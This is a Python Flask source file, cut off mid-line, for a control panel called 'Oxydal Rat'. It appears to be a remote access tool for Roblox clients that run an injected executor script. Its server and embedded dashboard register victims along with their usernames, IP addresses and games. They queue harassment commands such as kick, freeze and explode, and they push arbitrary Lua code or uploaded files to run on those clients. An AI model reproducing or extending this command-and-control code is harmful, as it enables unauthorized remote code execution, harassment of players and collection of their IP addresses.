from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO
import time
import eventlet
from datetime import datetime
import json
import os

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "super_secret_key_change_me_123456"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}
HISTORY_FILE = "history_log.json"

connected_players = {}
pending_kicks = {}
pending_commands = {}
history_log = []

def load_history():
    global history_log
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
                history_log = json.load(f)
        except:
            history_log = []

def save_history():
    try:
        with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
            json.dump(history_log, f, ensure_ascii=False, indent=2)
    except:
        pass

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS:
        abort(403)

@app.errorhandler(403)
def access_denied(e):
    detected = request.headers.get("X-Forwarded-For", request.remote_addr)
    if detected and "," in detected:
        detected = detected.split(",")[0].strip()
    return f"""
    <html>
      <body style="background:#000;color:#ff3366;font-family:Arial;text-align:center;padding-top:15%;">
        <h1>Accès refusé</h1>
        <p>Ta crue quoi fdp ?</p>
        <p>Ton IP : <b>{detected}</b></p>
      </body>
    </html>
    """, 403

@app.before_request
def protect_routes():
    if request.path in ["/", "/kick", "/troll"]:
        check_ip()

def add_history(event_type, username, details=""):
    timestamp = datetime.now().strftime("%H:%M:%S")
    history_log.insert(0, {
        "time": timestamp,
        "type": event_type,
        "username": username,
        "details": details
    })
    if len(history_log) > 100:
        history_log.pop()
    save_history()
    socketio.emit("history_update", {"history": history_log[:50]})

HTML = """<!DOCTYPE html>
<html lang="en" class="dark">
<head>
<meta charset="UTF-8">
<title>Oxydal Rat</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
html,body{height:100vh;overflow:hidden}
body{font-family:Inter,sans-serif;background:#020617;color:#fff;display:flex}

@keyframes glow{0%,100%{opacity:.5}50%{opacity:1}}
@keyframes pulse-blue{0%,100%{opacity:.3}50%{opacity:.6}}

.sidebar{width:250px;background:rgba(15,23,42,0.95);border-right:1px solid rgba(6,182,212,0.2);padding:20px;display:flex;flex-direction:column;gap:10px;backdrop-blur-sm}
.sidebar-btn{padding:15px;background:rgba(30,41,59,0.5);border:1px solid rgba(6,182,212,0.2);border-radius:12px;color:#94a3b8;font-size:1rem;font-weight:600;cursor:pointer;transition:all .3s;text-align:left}
.sidebar-btn:hover{background:rgba(6,182,212,0.1);border-color:rgba(6,182,212,0.5);color:#06b6d4}
.sidebar-btn.active{background:linear-gradient(135deg,rgba(6,182,212,0.2),rgba(59,130,246,0.2));border-color:#06b6d4;color:#06b6d4;box-shadow:0 0 20px rgba(6,182,212,0.3)}

.main-content{flex:1;display:flex;flex-direction:column;overflow:hidden;position:relative}
.main-content::before{content:"";position:absolute;top:20%;left:20%;width:500px;height:500px;background:radial-gradient(circle,rgba(6,182,212,0.15),transparent);border-radius:50%;filter:blur(100px);animation:glow 4s ease-in-out infinite;pointer-events:none}
.main-content::after{content:"";position:absolute;bottom:20%;right:20%;width:400px;height:400px;background:radial-gradient(circle,rgba(59,130,246,0.15),transparent);border-radius:50%;filter:blur(100px);animation:glow 4s ease-in-out infinite 2s;pointer-events:none}

.header{padding:20px 30px;text-align:center;border-bottom:1px solid rgba(6,182,212,0.2);background:rgba(15,23,42,0.5);backdrop-blur-sm;position:relative;z-index:10}
h1{font-size:2.5rem;font-weight:700;background:linear-gradient(135deg,#06b6d4,#3b82f6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:10px;text-shadow:0 0 30px rgba(6,182,212,0.5)}
.stats{font-size:1.2rem;color:#94a3b8;margin-top:8px}
.stats b{color:#06b6d4}

.content-area{flex:1;overflow:hidden;position:relative;z-index:5}
.tab-content{display:none;height:100%;overflow-y:auto;overflow-x:hidden;padding:25px}
.tab-content.active{display:block}
.tab-content::-webkit-scrollbar{width:8px}
.tab-content::-webkit-scrollbar-track{background:rgba(15,23,42,0.5);border-radius:10px}
.tab-content::-webkit-scrollbar-thumb{background:linear-gradient(180deg,#06b6d4,#3b82f6);border-radius:10px}
.tab-content::-webkit-scrollbar-thumb:hover{background:linear-gradient(180deg,#22d3ee,#60a5fa)}

.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:20px}
.card{background:rgba(15,23,42,0.8);border-radius:16px;padding:20px;box-shadow:0 4px 20px rgba(0,0,0,0.3);transition:all .3s;border:1px solid rgba(6,182,212,0.2);backdrop-blur-md;position:relative;overflow:hidden}
.card::before{content:"";position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(45deg,transparent,rgba(6,182,212,0.1),transparent);transform:rotate(45deg);transition:all .6s;opacity:0}
.card:hover{transform:translateY(-5px);box-shadow:0 8px 30px rgba(6,182,212,0.3);border-color:#06b6d4}
.card:hover::before{opacity:1;animation:shimmer 1.5s infinite}
@keyframes shimmer{0%{transform:translateX(-100%) rotate(45deg)}100%{transform:translateX(100%) rotate(45deg)}}

.status{display:flex;align-items:center;gap:10px;margin-bottom:12px}
.dot{width:10px;height:10px;border-radius:50%;background:#ef4444;box-shadow:0 0 10px #ef4444}
.dot.online{background:#06b6d4;box-shadow:0 0 15px #06b6d4;animation:pulse-blue 2s infinite}

.name{font-size:1.3rem;font-weight:700;color:#06b6d4;margin-bottom:8px;word-break:break-word}
.name a{color:#06b6d4;text-decoration:none;transition:color .3s}
.name a:hover{color:#22d3ee;text-decoration:underline}
.info{font-size:0.85rem;color:#94a3b8;margin-bottom:15px;line-height:1.6}
.category{font-weight:700;color:#22d3ee;margin:15px 0 10px;font-size:0.9rem;text-transform:uppercase;letter-spacing:1px}

button.kick-btn{padding:10px;border:none;border-radius:10px;cursor:pointer;font-weight:600;font-size:0.8rem;color:#fff;transition:all .3s;margin-bottom:6px;box-shadow:0 2px 8px rgba(0,0,0,0.2)}
button.kick-btn:hover{transform:scale(1.05);box-shadow:0 4px 15px rgba(0,0,0,0.4)}
button.kick-btn:disabled{background:#334155!important;cursor:not-allowed;transform:none;opacity:0.5}

.history-item{background:rgba(15,23,42,0.8);padding:15px;border-radius:12px;margin-bottom:12px;border-left:3px solid #06b6d4;transition:all .3s;backdrop-blur-md}
.history-item:hover{background:rgba(30,41,59,0.9);border-left-width:5px}
.history-item.connect{border-color:#06b6d4}
.history-item.disconnect{border-color:#ef4444}
.history-item.action{border-color:#f59e0b}
.history-time{color:#06b6d4;font-weight:700;font-size:0.85rem;margin-bottom:5px}
.history-user{color:#22d3ee;font-weight:600;font-size:1.05rem;margin-bottom:5px}
.history-details{color:#94a3b8;font-size:0.9rem}

.modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);align-items:center;justify-content:center;z-index:1000;backdrop-filter:blur(5px)}
.modal.active{display:flex}
.modal-content{background:rgba(15,23,42,0.95);padding:30px;border-radius:20px;width:90%;max-width:500px;box-shadow:0 20px 60px rgba(0,0,0,0.5);border:1px solid rgba(6,182,212,0.3);backdrop-filter:blur(20px)}
.modal-content h2{text-align:center;color:#06b6d4;margin-bottom:20px;font-size:1.5rem}
.modal-content input,.modal-content textarea{width:100%;padding:15px;border-radius:12px;border:1px solid rgba(6,182,212,0.3);background:rgba(30,41,59,0.5);color:#fff;font-size:1rem;margin-bottom:20px;font-family:inherit;transition:all .3s}
.modal-content input:focus,.modal-content textarea:focus{outline:none;border-color:#06b6d4;box-shadow:0 0 0 3px rgba(6,182,212,0.1)}
.modal-content textarea{min-height:120px;font-family:monospace;resize:vertical}
.modal-buttons{display:flex;gap:15px}
.modal-buttons button{flex:1;padding:14px;border:none;border-radius:12px;font-weight:700;cursor:pointer;transition:all .3s;font-size:0.95rem}
.confirm-btn{background:linear-gradient(135deg,#06b6d4,#3b82f6);color:#fff;box-shadow:0 4px 15px rgba(6,182,212,0.3)}
.confirm-btn:hover{box-shadow:0 6px 20px rgba(6,182,212,0.5);transform:translateY(-2px)}
.cancel-btn{background:rgba(71,85,105,0.5);color:#fff;border:1px solid rgba(148,163,184,0.3)}
.cancel-btn:hover{background:rgba(71,85,105,0.8)}

.toast-container{position:fixed;bottom:25px;right:25px;z-index:999}
.toast{background:rgba(15,23,42,0.95);border-left:4px solid #06b6d4;padding:15px 20px;margin-top:12px;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,0.5);backdrop-filter:blur(10px);border:1px solid rgba(6,182,212,0.3)}
.toast.danger{border-left-color:#ef4444}
</style>
</head>
<body>
<div class="sidebar">
    <div class="sidebar-btn active" onclick="switchTab('players')">👥 Players</div>
    <div class="sidebar-btn" onclick="switchTab('history')">📜 History</div>
</div>

<div class="main-content">
    <div class="header">
        <h1>Oxydal Rat</h1>
        <div class="stats" id="stats">Players online: <b>0</b></div>
    </div>
    
    <div class="content-area">
        <div class="tab-content active" id="players-tab">
            <div class="grid" id="players"></div>
        </div>
        
        <div class="tab-content" id="history-tab">
            <div id="history"></div>
        </div>
    </div>
</div>

<!-- Modals -->
<div class="modal" id="kickModal">
    <div class="modal-content">
        <h2>Kick Player</h2>
        <input type="text" id="kickReason" placeholder="Reason (optional)" autofocus>
        <div class="modal-buttons">
            <button class="cancel-btn" id="cancelKick">Cancel</button>
            <button class="confirm-btn" id="confirmKick">Confirm</button>
        </div>
    </div>
</div>

<div class="modal" id="playSoundModal">
    <div class="modal-content" style="border-left:4px solid #f97316">
        <h2 style="color:#f97316">Play Sound</h2>
        <input type="text" id="soundAssetId" placeholder="Enter Asset ID" autofocus>
        <div class="modal-buttons">
            <button class="cancel-btn" id="cancelSound">Cancel</button>
            <button class="confirm-btn" id="confirmSound" style="background:linear-gradient(135deg,#f97316,#ea580c)">Confirm</button>
        </div>
    </div>
</div>

<div class="modal" id="textScreenModal">
    <div class="modal-content">
        <h2>Display Text Screen</h2>
        <input type="text" id="screenText" placeholder="Enter text to display" autofocus>
        <div class="modal-buttons">
            <button class="cancel-btn" id="cancelText">Cancel</button>
            <button class="confirm-btn" id="confirmText">Display</button>
        </div>
    </div>
</div>

<div class="modal" id="luaExecModal">
    <div class="modal-content" style="border-left:4px solid #a855f7">
        <h2 style="color:#a855f7">Execute Lua Script</h2>
        <textarea id="luaScript" placeholder="Enter Lua code to execute"></textarea>
        <div class="modal-buttons">
            <button class="cancel-btn" id="cancelLua">Cancel</button>
            <button class="confirm-btn" id="confirmLua" style="background:linear-gradient(135deg,#a855f7,#9333ea)">Execute</button>
        </div>
    </div>
</div>

<div class="modal" id="importFileModal">
    <div class="modal-content" style="border-left:4px solid #10b981">
        <h2 style="color:#10b981">Import Lua File</h2>
        <input type="file" id="luaFileInput" accept=".lua,.txt" style="cursor:pointer;border:2px dashed rgba(16,185,129,0.5)">
        <div class="modal-buttons">
            <button class="cancel-btn" id="cancelImport">Cancel</button>
            <button class="confirm-btn" id="confirmImport" style="background:linear-gradient(135deg,#10b981,#059669)">Execute File</button>
        </div>
    </div>
</div>

<div class="toast-container" id="toasts"></div>

<script>
const socket = io();
let currentKickId=null,currentSoundId=null,currentTextId=null,currentLuaId=null,currentImportId=null;

const kickModal = document.getElementById("kickModal");
const playSoundModal = document.getElementById("playSoundModal");
const textScreenModal = document.getElementById("textScreenModal");
const luaExecModal = document.getElementById("luaExecModal");
const importFileModal = document.getElementById("importFileModal");

function switchTab(tab) {
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.sidebar-btn').forEach(b => b.classList.remove('active'));
    document.getElementById(tab + '-tab').classList.add('active');
    event.target.classList.add('active');
}

function toast(msg, type = "success") {
    const t = document.createElement("div");
    t.className = "toast " + (type === "danger" ? "danger" : "");
    t.textContent = msg;
    document.getElementById("toasts").appendChild(t);
    setTimeout(() => t.remove(), 5000);
}

function openKickModal(id) { currentKickId = id; kickModal.classList.add("active"); document.getElementById("kickReason").focus(); }
function closeModal() { kickModal.classList.remove("active"); currentKickId = null; }
function performKick() {
    if (!currentKickId) return;
    const reason = document.getElementById("kickReason").value.trim() || "Kicked by admin";
    fetch("/kick", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: currentKickId, reason: reason})});
    toast(`Kick sent`, "danger");
    closeModal();
}

function openPlaySoundModal(id) { currentSoundId = id; playSoundModal.classList.add("active"); document.getElementById("soundAssetId").focus(); }
function closeSoundModal() { playSoundModal.classList.remove("active"); currentSoundId = null; }
function performPlaySound() {
    if (!currentSoundId) return;
    const assetId = document.getElementById("soundAssetId").value.trim();
    if(!assetId) return toast("Enter a valid Asset ID", "danger");
    sendTroll(currentSoundId, "playsound", assetId);
    closeSoundModal();
}

function openTextScreenModal(id) { currentTextId = id; textScreenModal.classList.add("active"); document.getElementById("screenText").focus(); }
function closeTextModal() { textScreenModal.classList.remove("active"); currentTextId = null; }
function performTextScreen() {
    if (!currentTextId) return;
    const text = document.getElementById("screenText").value.trim();
    if(!text) return toast("Enter text to display", "danger");
    sendTroll(currentTextId, "textscreen", text);
    closeTextModal();
}

function openLuaExecModal(id) { currentLuaId = id; luaExecModal.classList.add("active"); document.getElementById("luaScript").focus(); }
function closeLuaModal() { luaExecModal.classList.remove("active"); currentLuaId = null; }
function performLuaExec() {
    if (!currentLuaId) return;
    const script = document.getElementById("luaScript").value.trim();
    if(!script) return toast("Enter Lua code", "danger");
    sendTroll(currentLuaId, "luaexec", script);
    closeLuaModal();
}

function openImportFileModal(id) { currentImportId = id; importFileModal.classList.add("active"); }
function closeImportModal() { importFileModal.classList.remove("active"); currentImportId = null; }
function performImportFile() {
    if (!currentImportId) return;
    const file = document.getElementById("luaFileInput").files[0];
    if(!file) return toast("Select a file", "danger");
    const reader = new FileReader();
    reader.onload = e => {
        sendTroll(currentImportId, "luaexec", e.target.result);
        closeImportModal();
        document.getElementById("luaFileInput").value = "";
    };
    reader.readAsText(file);
}

function sendTroll(id, cmd, param = null) {
    const body = {userid: id, cmd: cmd};
    if (param !== null) {
        if (cmd === "playsound") body.assetId = param;
        else if (cmd === "textscreen") body.text = param;
        else if (cmd === "luaexec") body.script = param;
    }
    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(body)});
    toast(`${cmd.toUpperCase()} sent`, "danger");
}

document.getElementById("cancelKick").onclick = closeModal;
document.getElementById("confirmKick").onclick = performKick;
document.getElementById("cancelSound").onclick = closeSoundModal;
document.getElementById("confirmSound").onclick = performPlaySound;
document.getElementById("cancelText").onclick = closeTextModal;
document.getElementById("confirmText").onclick = performTextScreen;
document.getElementById("cancelLua").onclick = closeLuaModal;
document.getElementById("confirmLua").onclick = performLuaExec;
document.getElementById("cancelImport").onclick = closeImportModal;
document.getElementById("confirmImport").onclick = performImportFile;

[kickModal, playSoundModal, textScreenModal, luaExecModal, importFileModal].forEach(m => {
    m.onclick = e => { if (e.target === m) m.classList.remove("active"); }
});

function render(data) {
    document.getElementById("stats").innerHTML = `Players online: <b>${data.online}</b> / ${data.total}`;
    const grid = document.getElementById("players");
    const currentIds = new Set(Object.keys(data.players));

    Object.entries(data.players).forEach(([id, p]) => {
        let card = document.getElementById(`card_${id}`);
        if (!card) { card = document.createElement("div"); card.className = "card"; card.id = `card_${id}`; grid.appendChild(card); }
        card.innerHTML = `
            <div class="status"><div class="dot ${p.online ? "online" : ""}"></div><span>${p.online ? "Online" : "Offline"}</span></div>
            <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>Game: <a href="https://www.roblox.com/games/${p.gameId}" target="_blank">${p.game}</a><br>JobId: ${p.jobId}</div>
            <div class="category">TROLLS</div>
            <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;">
                <button class="kick-btn" style="background:linear-gradient(135deg,#ef4444,#dc2626)" onclick="openKickModal('${id}')">KICK</button>
                <button class="kick-btn" style="background:linear-gradient(135deg,#a855f7,#9333ea)" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                <button class="kick-btn" style="background:linear-gradient(135deg,#06b6d4,#0891b2)" onclick="sendTroll('${id}','spin')">SPIN</button>
                <button class="kick-btn" style="background:linear-gradient(135deg,#eab308,#ca8a04)" onclick="sendTroll('${id}','jump')">JUMP</button>
                <button class="kick-btn" style="background:linear-gradient(135deg,#10b981,#059669)" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                <button class="kick-btn" style="background:linear-gradient(135deg,#f97316,#ea580c)" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                <button class="kick-btn" style="background:linear-gradient(135deg,#3b82f6,#2563eb)" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
                <button class="kick-btn" style="background:linear-gradient(135deg,#f97316,#ea580c)" onclick="openPlaySoundModal('${id}')">PLAY SOUND</button>
                <button class="kick-btn" style="background:linear-gradient(135deg,#06b6d4,#0891b2)" onclick="openTextScreenModal('${id}')">TEXT SCREEN</button>
            </div>
            <div class="category">UNDO</div>
            <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;">
                <button class="kick-btn" style="background:#475569" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                <button class="kick-btn" style="background:#475569" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                <button class="kick-btn" style="background:#475569" onclick="sendTroll('${id}','unrainbow')">STOP RAINBOW</button>
                <button class="kick-btn" style="background:#475569" onclick="sendTroll('${id}','uninvisible')">VISIBLE</button>
                <button class="kick-btn" style="background:#475569" onclick="sendTroll('${id}','stopsound')">STOP SOUND</button>
                <button class="kick-btn" style="background:#475569" onclick="sendTroll('${id}','hidetext')">HIDE TEXT</button>
            </div>
            <div class="category">LUA EXEC</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                <button class="kick-btn" style="background:linear-gradient(135deg,#10b981,#059669)" onclick="openImportFileModal('${id}')">IMPORT FILE</button>
                <button class="kick-btn" style="background:linear-gradient(135deg,#a855f7,#9333ea)" onclick="openLuaExecModal('${id}')">EXECUTOR</button>
            </div>
        `;
    });

    document.querySelectorAll('.card').forEach(c => {
        if (!currentIds.has(c.id.replace('card_', ''))) c.remove();
    });
}

function renderHistory(data) {
    const historyDiv = document.getElementById("history");
    historyDiv.innerHTML = "";
    data.history.forEach(item => {
        const div = document.createElement("div");
        div.className = `history-item ${item.type}`;
        div.innerHTML = `<div class="history-time">${item.time}</div><div class="history-user">${item.username}</div><div class="history-details">${item.details}</div>`;
        historyDiv.appendChild(div);
    });
}

socket.on("update", render);
socket.on("history_update", renderHistory);
socket.on("kick_notice", d => toast(`${d.username} → ${d.reason}`, "danger"));
socket.on("status", d => toast(`${d.username} is now ${d.online ? "online" : "offline"}`));

fetch("/get_history").then(r => r.json()).then(data => renderHistory(data));
</script>
</body>
</html>"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/get_history", methods=["GET"])
def get_history():
    return jsonify({"history": history_log[:50]})

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        try:
            d = request.get_json(silent=True) or {}
            uid = str(d["userid"])
            if d.get("action") == "register":
                username = d.get("username", "Unknown")
                connected_players[uid] = {
                    "username": username,
                    "executor": d.get("executor", "Unknown"),
                    "ip": d.get("ip", "Unknown"),
                    "last": now,
                    "online": True,
                    "game": d.get("game", "Unknown"),
                    "gameId": d.get("gameId", 0),
                    "jobId": d.get("jobId", "Unknown")
                }
                add_history("connect", username, f"Connected from {d.get('game', 'Unknown')}")
            elif d.get("action") == "heartbeat" and uid in connected_players:
                connected_players[uid]["last"] = now
        except: pass
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid", ""))
        if not uid: return jsonify({})
        if uid in pending_kicks:
            reason = pending_kicks.pop(uid, "Kicked")
            return jsonify({"command": "kick", "reason": reason})
        if uid in pending_commands:
            cmd = pending_commands.pop(uid)
            result = {"command": cmd.get
